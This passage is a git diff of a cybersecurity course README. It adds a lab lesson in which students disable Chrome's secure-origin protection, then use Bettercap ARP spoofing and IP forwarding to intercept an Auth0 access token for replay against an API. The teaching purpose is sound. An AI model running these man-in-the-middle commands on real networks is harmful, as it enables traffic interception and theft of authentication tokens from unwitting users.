@@ -287,7 +287,7 @@ Along with the above 5 features there are many other interesting ones. Please ex
 ## Lesson 4 - Hack the System
 In order to hack the system, we can't hack it while it runs on localhost. We may, of course, but that's no fun at all!
 
-**SETUP**
+### Setup the Hack Experiment
 - 3 computers: one client, one server, one hacker
 - 1 network: the client, server, and the hacker are on the same network.
 
@@ -297,6 +297,51 @@ You can check your IP address using `ip -c a`.
 On the server machine, run the server-side application with `npm start`.
 Now you can connect using the client machine to `http://<server-IP-address>:3000`.
 However, you may notice that the buttons are all grayed out. Why?
-Well, you need to change the 
+Well, you need to change the allowed origins and callbacks of your Auth0 application as in the following
 
-On the client machine, enable the console (Ctr_Shift+C for Firefox) and you'll notice the error "
+![image](https://user-images.githubusercontent.com/14936492/196711900-39b038e2-d37b-432f-a201-e59423d9d8aa.png)
+
+Remember to click on "save changes" at the bottom of the page.
+
+But still... you should see the buttons grayed out in the client machine. On the client machine, enable the console (Ctr_Shift+C for Firefox) and you'll notice the error "must run on a secure origin".
+
+![image](https://user-images.githubusercontent.com/14936492/196714499-ee1a9b85-d5d9-45b2-8691-4dc6ed25c34c.png)
+  
+This error is from your browser which doesn't allow you to run an application via HTTP. So, let's disable it for the sake of this experiment.
+Open the Chrome browser (or Brave, but not Firefox since it doesn't allow you to overwrite this security feature) and go to `chrome://flags` and search for "#unsafely-treat-insecure-origin-as-secure", add "http://server-ip-address:3000", click on "enable", and then on "relaunch". Now the buttons of the YALS application should be available from the client machine too.
+  
+### Capture the traffic
+The strategy is rather simple, first we capture the access token and then we use it to send a authenticated request to the API without logging in the application. 
+
+#### 1. Bettercap
+
+The hacker need to perform a MITM attack (see [the cybersecurity 1 course](https://edu.v-research.it/cybersecurity_2022/#lesson-4---with-great-power-comes-great-responsibility), lesson 4 sect 1.3). Instead of using Ettercap we are going to use [Bettercap](https://www.bettercap.org/), obviously because it's better. 
+
+```
+sudo docker run -it --privileged --net=host bettercap/bettercap -iface wlp0s20f3
+```
+
+#### 1. probe the network
+
+```
+net.probe on
+net.show
+```
+
+![image](https://user-images.githubusercontent.com/14936492/196728044-c6723043-c39c-4661-875b-88ec574ebd43.png)
+
+The IP address 172.16.21.152 (the client machine) is on my list and the server (172.16.22.28) 
+
+```
+set arp.spoof.fullduplex true
+set arp.spoof.targets 172.16.21.152,172.16.22.28
+arp.spoof on
+```
+
+![image](https://user-images.githubusercontent.com/14936492/196735953-b770dc49-6768-4526-8b17-dbc5bfcd37a8.png)
+
+
+Enable Kernel forwarding
+```
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+```
